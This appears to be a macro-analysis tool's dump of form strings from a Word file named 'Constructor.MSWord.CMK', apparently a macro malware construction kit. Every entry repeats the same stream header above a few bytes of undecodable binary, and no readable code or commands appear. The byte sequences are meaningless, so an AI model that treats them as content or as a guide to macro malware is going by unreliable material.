VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�z#X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#ѢЮ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k���rO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_�z�u�);u&t䖽
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��b��?�3i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
v�4v��4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�cgc�@`I���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A$SXj�Kt�FcB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%f����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7���U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����WR�?��G���I�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʟ�W?�X� ����S5�I8�F�˼Vt�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q]�0QE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kx��Fk����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k���A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^�	sm�3�%�`.q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k?�,�M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h���h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�:�	G�斃a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Gkq"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���f8�-��ߠ5�^�ߋ|G,��|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�U�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�χ��9�f��w�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fʹ2/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
',���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�|�Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5˳�۫ȯ�$PR0�hؽ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<Qr4�6fYw^�!7�yHQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^Z2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�Kd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=f�_�wl�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OPi�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[]$C�s�OL�o[��;�e�y�<���2�YLI�����=�N�88��ps�o[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ckp�Iss�l�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�<�*�|��o��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Hě�EkO����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@��|.c��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�微��$N?X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,lG{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"H���p=*���~�qsl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t	�BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ҝ�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QE���G��|ߣ����Cg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+;~�{qX>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڟ����B�)<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�� k+�b�VR�Y\FJ�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	$���jJI����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
";�H�P�?��׉�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Vׇ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RkKYb��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8��v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݢ�[)�-�����0�x�P��+;��T�(�.�O�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p���G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�9��z��|1u�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������R.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҳ�Uh�v��2���Ge
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�F\�OU�h�E�ˡ��-b�N�иG�mt�0�r�ZD��9��J�3��[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9rJ>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{���ީ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3G��WG"��_/�˙�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c�6�3� �PG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��W����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�!D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� �o���Q�U=��X���6�e"?�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B;������+L�-SD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/��O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
խG�E�#�7��*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B5oP �{I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f٧����Γ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ln=�+u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��K���+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
²�;i-޻h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��dv=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J��${h�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���܎A���j��5�9��n�;p�������.�].�o4Z�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W7�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z����n׏�r��_��uœI�"�Ȁm�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϩ玜<�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���pU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hJ�U��άgM�b�]�`Z^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ƴ(��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v_�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�O���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�V�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E'N/͇;F�����y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I���X���Q�M3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ì�m[�b�kH���A��R�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��öKb��@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�R\?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E��gL���,V�,�frH�o_"�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>�Ju�)f�	s'�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�"�����kk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
粃�9U���扪���zJ/�.%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����_�[=n�$\F_z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ί��!8�w�g�)J-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WK�d���^O��MmV���Ѡbz�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��*����瑢u+,|�5���5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>(e��p��9訤�O�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�s�B���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ԟ�U\�Է�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H&��oHĄ����S�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$rjD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t �GrGP=��:�[b�E���[H� ��"�6�~FI�ϭpׯN*�W���h�N�v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OB3���`A*{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�Ma%���
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�^x�{��渭J��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kL,�%i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q]� v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+l��nC7E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n��J�Ӱ�t��#�g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6�ᓟ�U�׽�u��m�a�Xm'*FO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
խY�$΄����jW@t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�5���i�ti��:�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�|�6m	q�
��Oӭh�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/a�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@z����󺿦j�Z\��L��~&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
